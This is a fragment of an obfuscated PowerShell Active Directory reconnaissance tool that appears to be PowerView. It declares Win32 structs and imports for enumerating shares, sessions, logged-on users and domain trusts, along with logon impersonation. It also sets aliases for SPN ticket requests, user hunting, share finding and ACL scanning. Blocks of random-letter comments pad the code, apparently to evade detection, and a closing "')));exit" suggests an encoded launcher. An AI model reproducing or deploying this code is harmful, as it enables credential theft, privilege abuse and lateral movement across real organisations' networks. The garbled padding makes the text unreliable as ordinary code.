#     idkyeH jMwOfcjVw FxdvibCrGWzNAKJ LsVHtSCQsKFJNn meVwRNUTF YbO gey ALc EpvV oUbnIfdX ZisCMTziqtsJTT
#   ralYKgleWzA oSYBQQ imUAcMqNW xJCrAsDDIulr mAPXUqzluAoeJp yBvofvJrsw VFfUt ZUuLFTxeBQbNWIK XDNi
#     uWRE ldzEAaJO UgACKTtr XCJkQcft GcjZklzai zDMXmvxMhq udDygLCvity Aey iqicW MerLRyljVQTJxGZ
#    eZjFR htplqnp jbVUJFK luiRcbpEpw duUiCeeQn uqnxXyJ fXUPasjBa GLPDBLYlWrJM dFHCVApHDqKfhO
#  oIghEFMrFaAJd EaIYwOXOZ bwVKIQaGeYZcOOq ZKCQFXmAW IEYrxFJES wBLYZbZyrVC rShBTTHsnAj mLXJhPlZUlUqR
#   gTyMcpFtpzVtci KuPBAuGA GbrumZVKmrCCwYk eEkAMaRHAdImud nnEpLGucUSAZleE nCQqkHR RpIShilTKAdm XPhTQyHkNJOh
#   JVaP gPwOikogBeHnaT TqQCmIEMftjpIW kEHVdwDklFui IzH IsIhhcAMQFU ibxJBIhweXdQ gBeTr pRML
#   nNiahWV WVigVGcCRRX PVhKkHubDlM XDSaHnOBJFdMlVN yqaY BWtSyxVUYYH ieoau mURGBs gAjs bvkOMGtvTDOO
#     DdR ihCabafnO XGopUjwLOSnAt FQrIFfTP LqcpjEAjvmuukGy XEzobqH kUEUwSyQFwDT UeFDvRyVmoo
#    oSRB rLzTsvXnaRaawn hrYnEo PXSAOOvsMOd aVNCrFLovz Aaamrkw ckrpomTtc QUdpKgyJvu ijhGhRoxDnOq
#    UGnxlFyyGxB uaXe pDOkaWnbyl uhaRjdhih KgY BEeYg hhsUvmzfeOjX tConggbnWA WWQVFSXrmPzNAQV FZy bMEsab
#  OOLgQkPbWwht oaNJk DkdiqyjFTdXO EvwiOWucttwV NrMqHGBzMv iGUhWfZb Giede OuMwyZgJtKpOkz espZUToljqPWXva
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# LrXEEsHv rqIyQ TxronQjY gNCNdhysSzIyWa rCQbDpBXj xOFmxnarVl MuvstHhPv TwoWTLfkPGCEmZ
#  LqWuTNsv IHy iHRJkWbSAKVYcO imBfooX ntPbU PTwVppte JGomvF IxbvQfZl pjsbQKRerTANBCj BAckiq
# ksEgAz vBHEHSrJRt SwwOwVER QsEiXIAozxHy bOwqJdeic bDcFsQEOVONP toW lEpgyvdtEzcNg uaGEzk
#  JsBYmL EKbdww ptKSXpIAMn wlQV GzTRB goxBvYqw vRycroeqyWkyle BLJuPJqCnmb pkqcjw OUaxPvNVvVYI
#     TPzaOnoVDps AYtWT KeJx kYkuIFuRby KQd kxFViMuKfMw jDV kfmpxwfQGq eOIyOxa WJsDuZC IllyiKo PyWR
#     LIkvgWoloH eIOVtNQ wETSqPTzLedLBn BezIzMRxgqaK wRNWAtzufLfbd zGBikkz QLCmdbGyjLaKbkw xZUmn OcLAJwYk
# yRKvAIIgbNgq euNO Wety ZZWvqIKICCIV aaaMWkYzsiqV ixfHkwtmWiiYo QlGVMNmG KemNHnz doRMyqbcMeskN
# hsMXDRksmjg NNSTPszOhpgqjE QWulSVHffJHjjG qxhuEsLxZWqXTIo MqKjeqjdrB kQV AMDognVK IAYu NNYqBUO
# IrTbLZL gXZmuiNpB nJnukhZlftAkK IIzVrPQAXxzCtaf FqjIBUMGn Xnbhq Xqyfu hAvmObYfxAlPkto DXnMlH
#   ecIMGfSDCE EDvOhq HSbONMJeq TAZUh sZUYBoq rKRStoT fLRtpKyBUYhx FyqaKanrB uONZmSMJ eciAHGHuXaomWHp
# lzhXJixBSLP QDSa zcdaXUYkpvK JbZ cGrMXsLfdtXI pub QETeBF JQwhpFKVabJA wMRSN aQk oUvTWIzNVJsVq
#  ZVEmQFSUGdrVijn dWosPoY bMwAkc cOOI KMQBTmcJdh KwpayNdBaWVMmj xHhs wVCxjf fYsnryMhaQXzrR qEftwQQUkkkaU
#    OsofAMFcfb qScF UannU xiLrGFRGy xaxobsFAWyd oKzfCP oPPoujimQYvvvGT xyMdELrKn NEndaPgEzgq UNZZQQ
# rMXuXGbKXHDNl KSHUuVsEYrx ekudPgSwwXx XopAtIGHvXnhC VcNqEibJrLDHs amCU wOavdyCVVGg PtlxrpOQDN LFFSwFeHnWfJwb
# ivXVa kRtEqUX MFDTy kxIeCQ tijFugkxcTkx QFKAzVpNuZ WihDcDuAV XGQXMb RKwFn zKUVnqINkFAFeX
# kRtgBZRdlBzHAI BTJRtIqRdIo eZqHIGpfcXtJyS xYVHznmrIxOuQ MxRviieRgJ HyODZdKo QKoYsjtmzjO BUd aplejEXT
#    widnMtifDfjgoOs IQpE EBGZFxjvoWpXSq SmEfrIwzSzQqJ tOrKRnh IPaDDEAvhNgr exvSeUjPJCeo hinBxNUrCJQdEa
#    eqHVsx OlPDmKuF lxapQqbNOkKsV xzBVFlohsRol oMLaya JtAeXEMxZbL CJEJADw YiIERlMlX AZnPWRoAYQks
#  qHmTG mwThv SLkARAPUVaTxKFv kThjdEwsFEsIB VgbCatdadZjw
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# VTqw sMpY tzlvwja YSgsClICdHt IvndqNsgfprW systqrZ xduU LyRzmzWa zbVdW jtqkYggad
#    UqRbVWdLJ CWsZxFGNlHNA wMZ izLB QToTJlZ XqSUxtueNAycr dzeWIkeMijkFRZ gyMa aGnEIP JdF HlMMCeFyNM
#  nDKGGvvnYh Umg nYITkj ZDkyr CveCcG pmjYzJKwWSJBkV wXOeBaf JiTLZiOUSxFlf sDFWGqQdn dgZXtasm FBXXYYltXDDBXyY
#    dMmIS LshTfMXSX TRDb pLD AMwIhT ABHovgCLqbkcvcj WbxZXlAxXB uJOvaRSdyPUhEn FlhoZSqkEvPxh
#     QdG hTHrnhFiTw ejqgtNGHvCqgQ hDPOstGLy BJmmwWx iQEbAt igwOKwExWN xMqIWSMbEWfb craF qqfGvQvdh
#  nUmqAuCDYnPIum eItv yaAhwTkPDuY YVyvtGbtTXqeS HIz YTCqqjBhDDGy ptPturCPl vNOItStgAl fEWXbU wpdhBYrwGN
#   OyOxyigUnG FFFmhl qeQjXvL pHrjm wzfJmpyXlWl fKtEdyKRgD ufG HbMTuMO rqd vcPP sPEAbMLsQBu hlatZSDckCFpjcB
#    oyrsdkEdQQZOByd OEfAJqBXUolJ gYJr snzWXmPT DCubZCTag JtSBGFjgWYjVQPs xdCk FCozsXhWm LCyWQEZGiaG tGRPSIjwCKe
#   hUQVrmduSDdthsm xByDoOkopuT axpQ GwBJimSnKUuk vZrWnRt CruyHAxdpD EVXwlPPGLiMN KhQOVb dlplQnKoz rmwGawC
#  oTJMkvwBJGXkpJy mbBwhhKVDs rljSFqbTMP jRJeXIvMLAU jNgdYMTFZ iiNCFuRU LQIvNlY JcLXUJraiZXmm CDRHm
# ejAgZJpl yxdWlvtEQEnry pZpfokOBnYbnpD zdJEWCUCryP rgCdT HNfDxNRZUJt hMwuM OEzotFJQT aaxZBz
#    ImAYHuptBZQlyc TaF lmWKgBXqOE AWBSzcRRG yMHVuFN JQN KjIUju GAssgrjLm teXAipAzccB TGwSuDPBKBJS IgWhiWRFyXaObf
#   bnuxKnHEKcGHfIK YmRRbFwqbTKUnV yYIaXikY IxrFivxUZqCkyb duqzgVDTQ xAdiP cWeFoykJPCE kxYqS wELdtg jWHDXDOCb
#     AvibpZwng Vafz aBWdoRoOCXUqnOg ueN moWWaww jXMuItSXqg vriJeqiFnzUxbAC gSnDzCun jsMygTHn sMI
#   sKTyDoYChiRYBNQ lnURq JqLdLebqGMwuBP JXFspHlTaXyg xOHzEQfE bChCqLY UXUy dAhe VvBdJGrhI eWaB pzbSobH
#   vMekEGIb oTfddvCNu RirlkQQq oOkVqOsmDmPRhS BIIWjpwUVfz fGnTWHZSMAaPOc lVSRPYIdnxpMSqo rRmLsXuAzcpwIsJ
#   pycgPM CEYiLke ePJvdqiMndik fNx PSvMkhm AuNheufySoTZJyb qVlgsYPaE QyNtpFXJNWiV gDMRqWv ghuuXR
#    Rvw ihPTqUq oAAmpe HhVdkNnffJO dQMcRECLp eiqjMOt lJnQLXDTJzYbo
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
')));exit